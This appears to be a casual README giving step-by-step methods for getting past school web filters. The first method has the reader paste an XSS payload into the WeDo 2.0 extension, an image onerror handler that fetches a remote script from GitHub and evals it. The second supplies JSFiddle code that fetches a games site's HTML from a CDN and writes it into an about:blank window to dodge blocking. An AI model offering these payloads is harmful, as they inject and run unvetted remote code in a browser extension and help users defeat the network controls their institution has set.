# stuff
A lot of this will be for how to get certain unblocked sites or for google and some might be unblock methods that will be found from 3hko/ext-remover that may work to this day 
sorry for bad explaining

# how to get unblocked google using WeDo 2.0
credit to @BlobbyBoi for this method

### Requirement
<b> access to Webstore
1. Search up WeDo 2.0 or WeDo2.0
2. Install extention
3. when its finished intalling create a new project
4. once you are in your project click on the the pencil on the top of your screen then the green document
5. once you clicked the green document copy this code
 ```js
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
```
6. paste the code into the box and now you can browse google without being it being blocked!

# How to get gn-math (unblocked site with web ported games that can be downloaded ) using JSfiddle 
### Requirements a working brain
1. head to JSfiddle.net
2. Now in each of the 3 boxes put each code below in order from HTML CSS and Javascript 
   
  ```HTML
<a id="button" class="button" >Launch</a>
```
```CSS
html,  body {

      0;

      padding: 0;

      height: 100%;

    }

 

    .button {

      display: flex;

      align-items: center;

      justify-content: center;

      width: 100vw;

      height: 100vh;

      background-color: #000000;

      color: #ffffff !important;

      Arial, sans-serif;

      font-size: 24px;

      font-weight: bold;

      cursor: pointer;

      text-decoration: none !important;

      transition: background-color 0.3s, transform 0.2s;

    }

 

    .button:hover {

      background-color: #4a148c !important;

    }
```
```js
document.addEventListener('DOMContentLoaded', function() {

      const button = document.getElementById('button');

      button.addEventListener('click', launch);

    });

 

    function launch() {

      try {

        fetch("https://cdn.jsdelivr.net/gh/gn-math/gn-math-DONTDMCA@main/singlefile.html?t="+Date.now())

          .then(response => response.text())

          .then(text => {

            const newWin = window.open("about:blank", "_blank");

            if (newWin) {

              newWin.document.open();

              newWin.document.write(text);

              newWin.document.close();

            }

          });

      } catch (error) {

        console.error('error:', error);

      }

    }
```
3. Once you are done Pasting all these codes into the boxes click Run then in the bottom right box click launch now you have gn-math!
   






